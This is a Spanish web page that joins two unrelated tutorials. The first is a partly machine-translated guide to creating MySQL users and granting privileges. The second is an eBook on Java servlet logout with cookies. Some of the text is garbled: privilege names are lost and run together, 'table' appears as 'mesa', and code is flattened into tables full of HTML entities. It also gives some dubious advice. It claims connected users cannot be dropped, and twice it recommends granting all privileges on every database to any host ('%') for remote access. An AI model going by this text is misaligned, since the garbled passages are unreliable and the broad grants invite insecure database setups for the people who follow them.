<summary><a href="https://www.digitalocean.com/community/tutorials/how-to-create-a-new-user-and-grant-permissions-in-mysql#creating-a-new-user">Creación de un nuevo usuario</a></summary>

Al instalar MySQL, se crea una cuenta de usuario **root** que permite administrar la base de datos. Este usuario tiene privilegios completos sobre el servidor MySQL, lo que significa que tiene control total sobre todas las bases de datos, tablas, usuarios, etc. Por ello, es recomendable evitar el uso de esta cuenta fuera de las funciones administrativas. Este paso describe cómo usar el usuario **root** de MySQL para crear una nueva cuenta de usuario y otorgarle privilegios.

En los sistemas Ubuntu que ejecutan MySQL `5.7`(y versiones posteriores), el usuario **root** de MySQL se autentica `auth_socket`de forma predeterminada mediante el complemento en lugar de con una contraseña. Este complemento requiere que el nombre del usuario del sistema operativo que invoca al cliente MySQL coincida con el nombre del usuario de MySQL especificado en el comando. Esto significa que debe anteponer al `mysql`comando `sudo`para invocarlo con los privilegios del usuario **root** de Ubuntu y así obtener acceso al usuario **root de MySQL:**

```
sudo mysql
```

**Nota:** Si su usuario **root** de MySQL está configurado para autenticarse con contraseña, deberá usar un comando diferente para acceder a la consola de MySQL. El siguiente comando ejecutará su cliente MySQL con privilegios de usuario normales, y solo obtendrá privilegios de administrador dentro de la base de datos al autenticarse con la contraseña correcta:

```
mysql -u root -p
```

Una vez que tenga acceso al indicador de MySQL, puede crear un nuevo usuario con una `CREATE USER`instrucción. La sintaxis general es:

```
CREATE USER 'username'@'host' IDENTIFIED WITH authentication_plugin BY 'password';
```

Después de `CREATE USER`, especificas un nombre de usuario. A continuación, se indica un `@`signo y luego el nombre de host desde el que se conectará este usuario. Si solo planeas acceder a este usuario localmente desde tu servidor Ubuntu, puedes especificar `localhost`. No siempre es necesario encerrar tanto el nombre de usuario como el host entre comillas simples, pero hacerlo puede ayudar a prevenir errores.

Tienes varias opciones a la hora de elegir el plugin de autenticación de usuarios. La siguiente tabla compara los principales métodos de autenticación:

| Complemento de autenticación | Seguridad                               | Acceso remoto | Caso de uso                                                            | Compatibilidad                      |
| ---------------------------- | --------------------------------------- | ------------- | ---------------------------------------------------------------------- | ----------------------------------- |
| `caching_sha2_password`      | Fuerte (SHA-256)                        | Sí            | Predeterminado para MySQL 8.0+, recomendado para aplicaciones nuevas.  | La mayoría de los clientes modernos |
| `mysql_native_password`      | Bueno (SHA-1)                           | Sí            | Compatibilidad con versiones anteriores, aplicaciones PHP (phpMyAdmin) | Clientes antiguos, PHP < 7.4        |
| `auth_socket`                | Fuerte (basado en el sistema operativo) | No            | Acceso solo local, no se requiere contraseña.                          | Solo sistemas Ubuntu/Debian         |

El `auth_socket`complemento mencionado anteriormente puede resultar práctico, ya que proporciona una seguridad sólida sin requerir que los usuarios autorizados introduzcan una contraseña para acceder a la base de datos. Sin embargo, también impide las conexiones remotas, lo que puede complicar las cosas cuando programas externos necesitan interactuar con MySQL.

Como alternativa, puede omitir `WITH authentication_plugin`por completo esa parte de la sintaxis para que el usuario se autentique con el complemento predeterminado de MySQL `caching_sha2_password`. [La documentación de MySQL recomienda este complemento](https://dev.mysql.com/doc/refman/8.0/en/upgrading-from-previous-series.html#upgrade-caching-sha2-password) para los usuarios que desean iniciar sesión con una contraseña debido a sus sólidas funciones de seguridad.

Ejecute el siguiente comando para crear un usuario que se autentique con `caching_sha2_password`. Asegúrese de cambiar `sammy`por su nombre de usuario preferido y `password`por una contraseña segura de su elección:

```
CREATE USER 'sammy'@'localhost' IDENTIFIED BY 'password';
```

**Nota** : Existe un problema conocido con algunas versiones de PHP que causa problemas con `caching_sha2_password`. Si planea usar esta base de datos con una aplicación PHP (phpMyAdmin, por ejemplo), es posible que desee crear un usuario que se autentique con el `mysql_native_password`complemento anterior, aunque sigue siendo seguro:

```
CREATE USER 'sammy'@'localhost' IDENTIFIED WITH mysql_native_password BY 'password';
```

Si no estás seguro, siempre puedes crear un usuario que se autentique con `caching_sha2_password`y luego `ALTER`hacerlo más tarde con este comando:

```
ALTER USER 'sammy'@'localhost' IDENTIFIED WITH mysql_native_password BY 'password';
```

Tras crear tu nuevo usuario, puedes otorgarle los privilegios adecuados.

</details>

<details open>

<summary><a href="https://www.digitalocean.com/community/tutorials/how-to-create-a-new-user-and-grant-permissions-in-mysql#granting-a-user-permissions">Otorgar permisos a un usuario</a></summary>

La sintaxis general para otorgar privilegios de usuario es la siguiente:

```
GRANT PRIVILEGE ON database.table TO 'username'@'host';
```

El `PRIVILEGE`valor en esta sintaxis de ejemplo define qué acciones puede realizar el usuario en la base de datos `database`y la tabla especificadas `table`. Puede otorgar varios privilegios al mismo usuario en un solo comando separándolos con una coma. También puede otorgar privilegios a un usuario de forma global introduciendo asteriscos (\* `*`) en lugar de los nombres de las bases de datos y las tablas. En SQL, los asteriscos son caracteres especiales que se utilizan para representar "todas" las bases de datos o tablas.

Para ilustrarlo, el siguiente comando otorga a un usuario privilegios globales sobre `CREATE`las bases de datos `ALTER`, `DROP`tablas y usuarios, así como la capacidad de consultar `INSERT`datos de cualquier tabla del servidor. También le otorga la capacidad de consultar datos con , crear claves foráneas con la palabra clave y realizar operaciones con el privilegio . Sin embargo, solo debe otorgar a los usuarios los permisos que necesitan, así que puede ajustar los privilegios de sus usuarios según sea necesario.`UPDATEDELETESELECTREFERENCESFLUSHRELOAD`

Puedes encontrar la lista completa de privilegios disponibles en [la documentación oficial de MySQL](https://dev.mysql.com/doc/refman/8.0/en/privileges-provided.html#privileges-provided-summary) .

Ejecute esta `GRANT`instrucción, reemplazando `sammy`con el nombre de su propio usuario de MySQL, para otorgar estos privilegios a su usuario:

```
GRANT CREATE, ALTER, DROP, INSERT, UPDATE, DELETE, SELECT, REFERENCES, RELOAD on *.* TO 'sammy'@'localhost' WITH GRANT OPTION;
```

Tenga en cuenta que esta instrucción también incluye `WITH GRANT OPTION`. Esto permitirá que su usuario de MySQL otorgue cualquier permiso que tenga a otros usuarios del sistema.

**Advertencia** : Algunos usuarios pueden querer otorgar a su usuario de MySQL el `ALL PRIVILEGES`privilegio que les proporcionará amplios privilegios de superusuario similares a los del usuario **root , como se muestra a continuación:**

```
GRANT ALL PRIVILEGES ON *.* TO 'sammy'@'localhost' WITH GRANT OPTION;
```

Estos amplios privilegios **no deben concederse a la ligera** , ya que cualquier persona con acceso a este usuario de MySQL tendrá control total sobre todas las bases de datos del servidor.

Muchas guías sugieren ejecutar el `FLUSH PRIVILEGES`comando inmediatamente después de una instrucción `CREATE USER`o `GRANT`para recargar las tablas de concesión y asegurar que los nuevos privilegios se apliquen:

```
FLUSH PRIVILEGES;
```

Sin embargo, según la [documentación oficial de MySQL](https://dev.mysql.com/doc/refman/8.0/en/privilege-changes.html) , cuando se modifican las tablas de concesiones indirectamente con una instrucción de administración de cuentas como esta `GRANT`, la base de datos recarga inmediatamente las tablas de concesiones en la memoria, lo que significa que el `FLUSH PRIVILEGES`comando no es necesario en nuestro caso. Por otro lado, ejecutarlo no tendrá ningún efecto negativo en el sistema.

Si necesita revocar un permiso, la estructura es casi idéntica a la de otorgarlo:

```
REVOKE type_of_permission ON database_name.table_name FROM 'username'@'host';
```

Tenga en cuenta que al revocar permisos, la sintaxis requiere que utilice `FROM`, en lugar de `TO`la que utilizó al otorgar los permisos.

Puedes revisar los permisos actuales de un usuario ejecutando el `SHOW GRANTS`comando:

```
SHOW GRANTS FOR 'username'@'host';
```

Así como puedes eliminar bases de datos con `DROP`, puedes usar `DROP`para eliminar un usuario:

```
DROP USER 'username'@'localhost';
```

Después de crear su usuario de MySQL y otorgarle privilegios, puede salir del cliente de MySQL:

```
exit
```

En el futuro, para iniciar sesión como su nuevo usuario de MySQL, deberá usar un comando como el siguiente:

```
mysql -u sammy -p
```

Esta `-p`opción hará que el cliente MySQL le solicite la contraseña de su usuario MySQL para autenticarse.

</details>

<details open>

<summary><a href="https://www.digitalocean.com/community/tutorials/how-to-create-a-new-user-and-grant-permissions-in-mysql#removing-a-mysql-user">Eliminar un usuario de MySQL</a></summary>

Para eliminar un usuario de MySQL, puede utilizar el `DROP USER`comando. La sintaxis de este comando es la siguiente:

```
DROP USER 'username'@'host';
```

Reemplaza `username`con el nombre de usuario real que deseas eliminar y `host`con el nombre de host o la dirección IP desde la que el usuario puede conectarse. Por ejemplo, para eliminar un usuario llamado 'sammy' que puede conectarse desde 'localhost', usarías:

```
DROP USER 'sammy'@'localhost';
```

Tras ejecutar este comando, el usuario especificado será eliminado del servidor MySQL. Tenga en cuenta que esta acción es irreversible, así que úsela con precaución y solo cuando esté seguro de que desea eliminar al usuario.

También es importante tener en cuenta que no se puede eliminar a un usuario que esté conectado al servidor MySQL. Si lo intenta, recibirá un mensaje de error que indica que el usuario sigue conectado. Deberá desconectar al usuario antes de intentar eliminarlo.

</details>

<details open>

<summary><a href="https://www.digitalocean.com/community/tutorials/how-to-create-a-new-user-and-grant-permissions-in-mysql#common-errors-and-debugging">Errores comunes y depuración</a></summary>

#### [1. Acceso denegado por error del usuario.](https://www.digitalocean.com/community/tutorials/how-to-create-a-new-user-and-grant-permissions-in-mysql#1-access-denied-for-user-error)

El `Access denied for user`error se produce cuando un usuario intenta conectarse a MySQL con credenciales incorrectas o permisos insuficientes. Para solucionarlo, verifique las credenciales y otorgue los permisos necesarios.

Para solucionar este error, siga estos pasos:

* **Verificar credenciales de usuario** : Asegúrese de que el nombre de usuario, la contraseña y el host sean correctos. Compruebe que el nombre de usuario y la contraseña estén escritos correctamente y que el host esté configurado con el valor correcto (por ejemplo, 'localhost', '%' o una dirección IP específica).
* **Verificar privilegios** : Asegúrese de que el usuario tenga los privilegios necesarios para acceder a la base de datos. Puede hacerlo ejecutando el `SHOW GRANTS`comando para revisar los permisos actuales del usuario:

```
SHOW GRANTS FOR 'username'@'localhost';
```

Esto mostrará los privilegios actuales otorgados al usuario. Si el usuario carece de los privilegios necesarios, puede otorgárselos mediante el `GRANT`comando.

* **Acceso a una base de datos o tabla específica** : Si el usuario intenta acceder a una base de datos o tabla específica, asegúrese de que se le hayan otorgado privilegios sobre dicha base de datos o tabla. Por ejemplo, para otorgar privilegios sobre una base de datos específica:

```
GRANT ALL PRIVILEGES ON database_name.* TO 'username'@'localhost';
```

O bien, para otorgar privilegios en una mesa específica:

```
GRANT SELECT, INSERT, UPDATE, DELETE ON database_name.table_name TO 'username'@'localhost';
```

Estos pasos solucionan el `Access denied for user`error y garantizan que el usuario tenga el acceso necesario a la base de datos MySQL.

#### [2. El usuario no puede conectarse de forma remota.](https://www.digitalocean.com/community/tutorials/how-to-create-a-new-user-and-grant-permissions-in-mysql#2-user-not-being-able-to-connect-remotely)

Habilite las conexiones remotas otorgando privilegios con el nombre de host configurado como `%`(cualquier host) o una dirección IP específica. Por ejemplo:

```
GRANT ALL PRIVILEGES ON *.* TO 'username'@'%';
```

Esto otorga todos los privilegios al usuario 'username' desde cualquier host (%).

#### [3. Error 1396: Falló la operación CREAR USUARIO](https://www.digitalocean.com/community/tutorials/how-to-create-a-new-user-and-grant-permissions-in-mysql#3-error-1396-operation-create-user-failed)

El error 1396 se produce al intentar crear un usuario que ya existe. Compruebe si el usuario existe y, a continuación, modifique la cuenta existente o elimínela antes de crear una nueva.

Para comprobar si un usuario ya existe, utilice el siguiente comando:

```
SELECT * FROM mysql.user WHERE User = 'newuser';
```

Si el usuario existe, elimine la cuenta de usuario existente:

```
DROP USER 'newuser'@'%';
```

A continuación, crea la nueva cuenta de usuario:

```
CREATE USER 'newuser'@'%' IDENTIFIED BY 'password';
```

</details>

<details open>

<summary><a href="https://www.digitalocean.com/community/tutorials/how-to-create-a-new-user-and-grant-permissions-in-mysql#faqs">Preguntas frecuentes</a></summary>

#### [1. ¿Cómo creo un usuario de MySQL con privilegios limitados?](https://www.digitalocean.com/community/tutorials/how-to-create-a-new-user-and-grant-permissions-in-mysql#1-how-do-i-create-a-mysql-user-with-limited-privileges)

Cree un usuario de MySQL con privilegios limitados especificando únicamente los privilegios necesarios. Por ejemplo, para otorgar privilegios de SELECT, INSERT, UPDATE y DELETE en una base de datos específica:

```
GRANT SELECT, INSERT, UPDATE, DELETE ON database_name.* TO 'username'@'localhost';
```

Este enfoque garantiza que el usuario solo pueda realizar las acciones especificadas en la base de datos especificada, limitando así sus privilegios.

#### [2. ¿Cómo puedo comprobar los permisos de usuario de MySQL?](https://www.digitalocean.com/community/tutorials/how-to-create-a-new-user-and-grant-permissions-in-mysql#2-how-do-i-check-mysql-user-permissions)

Compruebe los permisos de usuario de MySQL mediante el `SHOW GRANTS`comando. La sintaxis es:

```
SHOW GRANTS FOR 'username'@'localhost';
```

Este comando mostrará todos los privilegios otorgados al usuario especificado.

#### [3. ¿Cuál es la diferencia entre OTORGAR TODOS LOS PRIVILEGIOS y privilegios específicos?](https://www.digitalocean.com/community/tutorials/how-to-create-a-new-user-and-grant-permissions-in-mysql#3-what-is-the-difference-between-grant-all-privileges-and-specific-privileges)

`GRANT ALL PRIVILEGES`Los privilegios generales otorgan a un usuario todos los privilegios disponibles en una base de datos o tabla, mientras que los privilegios específicos limitan su acceso únicamente a las acciones indicadas. Otorgar todos los privilegios puede suponer un riesgo de seguridad, ya que le confiere al usuario control total sobre la base de datos o tabla. Por otro lado, otorgar privilegios específicos garantiza que el usuario solo pueda realizar las acciones necesarias para su rol, reduciendo así el riesgo de acceso o modificaciones no autorizadas.

#### [4. ¿Cómo puedo permitir el acceso remoto a un usuario de MySQL?](https://www.digitalocean.com/community/tutorials/how-to-create-a-new-user-and-grant-permissions-in-mysql#4-how-do-i-allow-remote-access-to-a-mysql-user)

Permita el acceso remoto otorgando privilegios con el nombre de host configurado como `%`(cualquier host). Por ejemplo:

```
GRANT ALL PRIVILEGES ON *.* TO 'username'@'%';
```

Esto otorga al usuario todos los privilegios desde cualquier host, permitiendo el acceso remoto.

#### [5. ¿Cómo puedo eliminar un usuario de MySQL de forma segura?](https://www.digitalocean.com/community/tutorials/how-to-create-a-new-user-and-grant-permissions-in-mysql#5-how-do-i-delete-a-mysql-user-safely)

Elimine un usuario de MySQL de forma segura revocando primero todos sus privilegios y, a continuación, eliminando la cuenta de usuario:

```
REVOKE ALL PRIVILEGES ON *.* FROM 'username'@'localhost';
DROP USER 'username'@'localhost';
```

Este método garantiza que la cuenta de usuario se elimine de forma segura, sin dejar privilegios residuales que pudieran ser explotados.

</details>

<details open>

<summary><a href="https://www.digitalocean.com/community/tutorials/how-to-create-a-new-user-and-grant-permissions-in-mysql#conclusion">Conclusión</a></summary>

Siguiendo este tutorial, has aprendido a añadir nuevos usuarios y otorgarles diversos permisos en una base de datos MySQL. A partir de aquí, puedes seguir explorando y experimentando con diferentes configuraciones de permisos para tu usuario de MySQL, o quizás quieras profundizar en algunas configuraciones avanzadas de MySQL.

Para obtener más información sobre los conceptos básicos de MySQL, puede consultar los siguientes tutoriales:

* [Cómo modificar los privilegios de usuario en MySQL](https://docs.digitalocean.com/products/databases/mysql/how-to/modify-user-privileges/) .
* [Introducción a las consultas en MySQL](https://www.digitalocean.com/community/tutorials/introduction-to-queries-mysql) .
* [Comprender las bases de datos relacionales](https://www.digitalocean.com/community/tutorials/understanding-relational-databases) .

</details>

## Implementación de la Funcionalidad de Cierre de Sesión Usando Cookies en Aplicaciones Web de Java

### Tabla de Contenidos

1. [Introducción](https://live-owl.10web.me/es/course-articles/jsp-and-servlets-articles-es/user-logout-using-cookie-es/#introduction)
2. [Comprendiendo el Proceso de Cierre de Sesión](https://live-owl.10web.me/es/course-articles/jsp-and-servlets-articles-es/user-logout-using-cookie-es/#understanding-the-logout-process)
3. [Configuración del Formulario de Cierre de Sesión](https://live-owl.10web.me/es/course-articles/jsp-and-servlets-articles-es/user-logout-using-cookie-es/#setting-up-the-logout-form)
4. [Creación del Controller del Área de Miembros](https://live-owl.10web.me/es/course-articles/jsp-and-servlets-articles-es/user-logout-using-cookie-es/#creating-the-member-area-controller)
5. [Manejo de Solicitudes de Cierre de Sesión](https://live-owl.10web.me/es/course-articles/jsp-and-servlets-articles-es/user-logout-using-cookie-es/#handling-logout-requests)
6. [Gestión de Cookies para el Cierre de Sesión](https://live-owl.10web.me/es/course-articles/jsp-and-servlets-articles-es/user-logout-using-cookie-es/#managing-cookies-for-logout)
7. [Pruebas de la Funcionalidad de Cierre de Sesión](https://live-owl.10web.me/es/course-articles/jsp-and-servlets-articles-es/user-logout-using-cookie-es/#testing-the-logout-functionality)
8. [Conclusión](https://live-owl.10web.me/es/course-articles/jsp-and-servlets-articles-es/user-logout-using-cookie-es/#conclusion)
9. [Recursos Adicionales](https://live-owl.10web.me/es/course-articles/jsp-and-servlets-articles-es/user-logout-using-cookie-es/#additional-resources)

***

### Introducción <a href="#introduction" id="introduction"></a>

En el ámbito del desarrollo de aplicaciones web, la autenticación de usuarios y la gestión de sesiones son fundamentales para mantener la seguridad y garantizar una experiencia de usuario fluida. Una característica esencial en este dominio es la **funcionalidad de cierre de sesión**, que permite a los usuarios terminar sus sesiones de manera segura. Implementar un mecanismo de cierre de sesión efectivo no solo mejora la seguridad al prevenir accesos no autorizados, sino que también incrementa la confianza del usuario.

Este eBook profundiza en las complejidades de implementar la funcionalidad de cierre de sesión utilizando cookies en aplicaciones web basadas en Java. Exploraremos el proceso paso a paso, desde la configuración del formulario de cierre de sesión hasta la gestión de cookies y el manejo de solicitudes de cierre de sesión. Al final de esta guía, tendrás una comprensión completa de cómo integrar una robusta función de cierre de sesión en tus aplicaciones web de Java.

#### Importancia de la Funcionalidad de Cierre de Sesión

* **Mejora de la Seguridad**: Los mecanismos adecuados de cierre de sesión previenen accesos no autorizados al asegurar que las sesiones de los usuarios sean terminadas apropiadamente.
* **Confianza del Usuario**: Proporcionar una opción de cierre de sesión confiable fomenta la confianza, asegurando a los usuarios que sus datos están seguros.
* **Gestión de Sesiones**: Procesos eficientes de cierre de sesión contribuyen a una gestión efectiva de sesiones, optimizando los recursos del servidor.

#### Pros y Contras de Usar Cookies para el Cierre de Sesión

| **Pros**                                                                               | **Contras**                                                                                         |
| -------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------- |
| Fácil de implementar y gestionar datos de sesión.                                      | Las cookies pueden ser susceptibles a vulnerabilidades de seguridad si no se manejan adecuadamente. |
| Persistentes a través de sesiones del navegador, mejorando la experiencia del usuario. | El uso excesivo de cookies puede llevar a problemas de rendimiento.                                 |
| Ampliamente soportadas en diferentes navegadores y plataformas.                        | Requiere un manejo cuidadoso para asegurar la privacidad e integridad de los datos.                 |

#### Cuándo y Dónde Usar Cierre de Sesión Basado en Cookies

* **Aplicaciones Web**: Ideal para aplicaciones donde mantener sesiones de usuario a través de múltiples páginas es esencial.
* **Áreas Seguras**: Utilizar en secciones exclusivas para miembros o áreas que requieren medidas de seguridad reforzadas.
* **Plataformas de Comercio Electrónico**: Asegura que las sesiones de los usuarios se terminen después de transacciones, protegiendo información sensible.

***

### Comprendiendo el Proceso de Cierre de Sesión <a href="#understanding-the-logout-process" id="understanding-the-logout-process"></a>

Antes de profundizar en la implementación, es crucial entender la mecánica subyacente del proceso de cierre de sesión en aplicaciones web.

#### Fundamentos de la Gestión de Sesiones

* **Creación de Sesión**: Cuando un usuario inicia sesión, se crea una sesión para rastrear sus interacciones y mantener el estado a través de múltiples solicitudes.
* **Terminación de Sesión**: Cerrar sesión implica terminar esta sesión, asegurando que las solicitudes posteriores no mantengan el estado autenticado.

#### Rol de las Cookies en la Gestión de Sesiones

Las cookies juegan un papel fundamental en mantener los estados de sesión al almacenar identificadores de sesión en el navegador del cliente. Estos identificadores se envían con cada solicitud, permitiendo que el servidor reconozca y autentique al usuario.

#### Pasos Involucrados en el Cierre de Sesión

1. **El Usuario Inicia el Cierre de Sesión**: Hace clic en el botón/enlace de cierre de sesión.
2. **Invalidación de Sesión**: El servidor invalida la sesión del usuario, eliminando los datos de la sesión.
3. **Gestión de Cookies**: Se eliminan o expiran las cookies relevantes para prevenir futuras autenticaciones.
4. **Redirección**: El usuario es redirigido a la página de inicio de sesión o a la página principal, confirmando la acción de cierre de sesión.

***

### Configuración del Formulario de Cierre de Sesión <a href="#setting-up-the-logout-form" id="setting-up-the-logout-form"></a>

El formulario de cierre de sesión facilita la acción del usuario para terminar su sesión. Implementarlo correctamente asegura que el proceso de cierre de sesión se inicie sin problemas.

#### Creación de un Formulario de Cierre de Sesión Invisible

Un formulario invisible puede ser incrustado en la interfaz de usuario, permitiendo un proceso de cierre de sesión fluido sin interrumpir la experiencia del usuario.

Java

|   | \&lt;form action="${pageContext.request.contextPath}/logout" method="get"\&gt;    \&lt;input type="hidden" name="action" value="destroy"\&gt;    \&lt;input type="submit" value="Logout"\&gt;\&lt;/form\&gt;  |
| - | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |

#### Desglose de los Elementos del Formulario

* **Acción del Formulario**: Apunta a la URL `/logout`, dirigiendo la solicitud de cierre de sesión al controller apropiado.
* **Input Oculto**: Transporta el parámetro `action` con el valor `destroy`, indicando la intención de terminar la sesión.
* **Botón de Envío**: Visible como el botón "Logout", permitiendo a los usuarios iniciar el proceso de cierre de sesión.

#### Agregar el Botón de Cierre de Sesión

Integra el formulario de cierre de sesión dentro del área de miembros de tu aplicación para proporcionar un acceso fácil a los usuarios.

Java

|   | \&lt;!-- Member Area HTML --\&gt;\&lt;div class="member-area"\&gt;    \&lt;!-- Otro contenido específico de miembros --\&gt;    \&lt;form action="${pageContext.request.contextPath}/logout" method="get"\&gt;        \&lt;input type="hidden" name="action" value="destroy"\&gt;        \&lt;input type="submit" value="Logout"\&gt;    \&lt;/form\&gt;\&lt;/div\&gt;  |
| - | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |

***

### Creación del Controller del Área de Miembros <a href="#creating-the-member-area-controller" id="creating-the-member-area-controller"></a>

El controller maneja la lógica de negocio asociada con el área de miembros, incluyendo el procesamiento de solicitudes de cierre de sesión.

#### Configuración del MemberAreaController

Java

|   | package org.studyeasy; import jakarta.servlet.\*;import jakarta.servlet.http.\*;import jakarta.servlet.annotation.\*;import java.io.IOException; @WebServlet("/logout")public class MemberAreaController extends HttpServlet {    @Override    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {        String action = request.getParameter("action");                if ("destroy".equals(action)) {            // Invalidate the session            HttpSession session = request.getSession(false);            if (session != null) {                session.invalidate();            }                        // Remove specific cookies            Cookie\[] cookies = request.getCookies();            if (cookies != null) {                for (Cookie cookie : cookies) {                    if ("username".equals(cookie.getName())) {                        cookie.setValue(null);                        cookie.setMaxAge(0);                        response.addCookie(cookie);                    }                }            }                        // Redirect to login page            response.sendRedirect(request.getContextPath() + "/login.jsp");        } else {            // Handle unexpected action            response.sendError(HttpServletResponse.SC\_BAD\_REQUEST, "Unexpected action");        }    \}}  |
| - | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |

#### Explicación del Controller

1. **Recuperación del Parámetro Action**: El controller obtiene el parámetro `action` para determinar la operación requerida.
2. **Invalidación de Sesión**: Si la acción es `destroy`, la sesión actual se invalida, asegurando que todos los datos de la sesión sean eliminados.
3. **Gestión de Cookies**: Se identifican y invalidan cookies específicas, como `username`, estableciendo su valor a `null` y su tiempo de vida a `0`.
4. **Redirección**: Después de invalidar exitosamente la sesión y las cookies, el usuario es redirigido a la página `login.jsp`.
5. **Manejo de Errores**: Si se recibe una acción inesperada, el controller responde con un error `400 Bad Request`.

***

### Manejo de Solicitudes de Cierre de Sesión <a href="#handling-logout-requests" id="handling-logout-requests"></a>

El manejo adecuado de las solicitudes de cierre de sesión asegura que la sesión del usuario sea terminada de manera segura y eficiente.

#### Enrutando la Solicitud de Cierre de Sesión

Asegúrate de que la acción del formulario de cierre de sesión apunte al mapeo de servlet correcto.

Java

|   | \&lt;form action="${pageContext.request.contextPath}/logout" method="get"\&gt;    \&lt;input type="hidden" name="action" value="destroy"\&gt;    \&lt;input type="submit" value="Logout"\&gt;\&lt;/form\&gt;  |
| - | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |

#### Implementando el Método doGet

El método `doGet` en el `MemberAreaController` procesa la solicitud de cierre de sesión.

Java

|   | @Overrideprotected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {    String action = request.getParameter("action");        if ("destroy".equals(action)) {        // Invalidate session and manage cookies    } else {        // Handle unexpected action    \}}  |
| - | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |

#### Manejo de Errores en Solicitudes de Cierre de Sesión

El manejo adecuado de errores asegura que cualquier comportamiento inesperado durante el proceso de cierre de sesión se gestione de manera adecuada.

Java

|   | else {    // Handle unexpected action    response.sendError(HttpServletResponse.SC\_BAD\_REQUEST, "Unexpected action");}  |
| - | ------------------------------------------------------------------------------------------------------------------------- |

***

### Gestión de Cookies para el Cierre de Sesión <a href="#managing-cookies-for-logout" id="managing-cookies-for-logout"></a>

Las cookies son fundamentales para mantener las sesiones de usuario. Una gestión adecuada durante el cierre de sesión es crucial para prevenir accesos no autorizados.

#### Recuperando Cookies de la Solicitud

Java

|   | Cookie\[] cookies = request.getCookies();  |
| - | ------------------------------------------ |

#### Iterando a Través de las Cookies

Java

|   | if (cookies != null) {    for (Cookie cookie : cookies) {        if ("username".equals(cookie.getName())) {            // Invalidate specific cookie        }    \}}  |
| - | --------------------------------------------------------------------------------------------------------------------------------------------------------------------- |

#### Invalidando Cookies Específicas

Java

|   | cookie.setValue(null);cookie.setMaxAge(0);response.addCookie(cookie);  |
| - | ---------------------------------------------------------------------- |

* **Establecer Valor a Null**: Elimina el valor existente de la cookie.
* **Establecer Tiempo de Vida a 0**: Indica al navegador que elimine la cookie inmediatamente.
* **Agregar Cookie a la Respuesta**: Actualiza el navegador del cliente con la cookie modificada.

#### Asegurando la Seguridad de las Cookies

*   **Bandera HttpOnly**: Previene que scripts del lado del cliente accedan a la cookie.\
    Java

    |   | cookie.setHttpOnly(true);  |
    | - | -------------------------- |
*   **Bandera Secure**: Asegura que la cookie solo se envíe a través de HTTPS.\
    Java

    |   | cookie.setSecure(true);  |
    | - | ------------------------ |

***

### Pruebas de la Funcionalidad de Cierre de Sesión <a href="#testing-the-logout-functionality" id="testing-the-logout-functionality"></a>

Pruebas exhaustivas aseguran que la función de cierre de sesión opere como se espera en diferentes escenarios.

#### Ejecutando la Aplicación

1. **Iniciar el Servidor Web**: Asegúrate de que tu servidor (por ejemplo, Apache Tomcat) esté en funcionamiento.
2. **Acceder a la Aplicación**: Navega al área de miembros iniciando sesión.
3. **Iniciar el Cierre de Sesión**: Haz clic en el botón "Logout" para activar el proceso de cierre de sesión.

#### Escenarios Comunes de Prueba

| **Caso de Prueba**                                | **Resultado Esperado**                                                                                     |
| ------------------------------------------------- | ---------------------------------------------------------------------------------------------------------- |
| Logout Exitoso                                    | El usuario es redirigido a la página de inicio de sesión, la sesión se invalida y las cookies se eliminan. |
| Cierre de Sesión Sin una Sesión Activa            | La aplicación maneja la situación sin errores, posiblemente redirigiendo a la página de inicio de sesión.  |
| Solicitud de Cierre de Sesión Manipulada          | La aplicación responde con un error `400 Bad Request`, previniendo acciones no autorizadas.                |
| Cookies Persistentes Después del Cierre de Sesión | Las cookies relacionadas con la sesión se eliminan o expiran, asegurando que no queden datos residuales.   |

#### Consejos para la Solución de Problemas

* **Necesidad de Reiniciar el Servidor Web**: Si los cambios no se reflejan, reinicia el servidor web para aplicar las actualizaciones.
* **Verificar Nombres de Cookies**: Asegúrate de que los nombres de las cookies utilizados en el controller coincidan con los establecidos durante el inicio de sesión.
* **Revisar los Mapeos del Controller**: Verifica que los mapeos de servlets en `web.xml` o las anotaciones apunten correctamente al controller.
* **Inspeccionar Cookies del Navegador**: Utiliza las herramientas de desarrollo del navegador para confirmar que las cookies se eliminan al cerrar sesión.

***

### Conclusión <a href="#conclusion" id="conclusion"></a>

Implementar una funcionalidad de cierre de sesión robusta es una piedra angular en el desarrollo seguro de aplicaciones web. Al aprovechar las cookies para la gestión de sesiones, los desarrolladores pueden asegurar que las sesiones de los usuarios se manejen de manera eficiente, mejorando tanto la seguridad como la experiencia del usuario. Esta guía proporcionó un recorrido completo para configurar el proceso de cierre de sesión, desde la creación del formulario de cierre de sesión hasta la gestión de cookies y el manejo de solicitudes de cierre de sesión dentro de una aplicación web de Java.

**Principales Aprendizajes**:

* **Invalidación de Sesiones**: Terminar adecuadamente las sesiones de los usuarios previene accesos no autorizados.
* **Gestión de Cookies**: Manejar eficazmente las cookies asegura que los datos sensibles no queden expuestos después del cierre de sesión.
* **Manejo de Errores**: Anticipar y gestionar posibles errores mejora la fiabilidad de la función de cierre de sesión.
* **Pruebas**: Pruebas rigurosas en diversos escenarios aseguran la solidez de la implementación.

Al adherirse a estos principios y prácticas, los desarrolladores pueden fortalecer sus aplicaciones contra vulnerabilidades de seguridad y proporcionar una experiencia fluida para sus usuarios.

**Palabras Clave SEO**: funcionalidad de cierre de sesión, aplicaciones web de Java, gestión de sesiones, cookies, mejora de la seguridad, controller del área de miembros, invalidación de sesión, gestión de cookies, servidor web, autenticación, terminación de sesión, cierre de sesión seguro, servlets de Java, seguridad en el desarrollo web, autenticación de usuarios, cookies de sesión, invalidar sesión, expiración de cookies, HttpOnly, bandera Secure, cierre de sesión en Java JSP, seguridad de aplicaciones web.

***

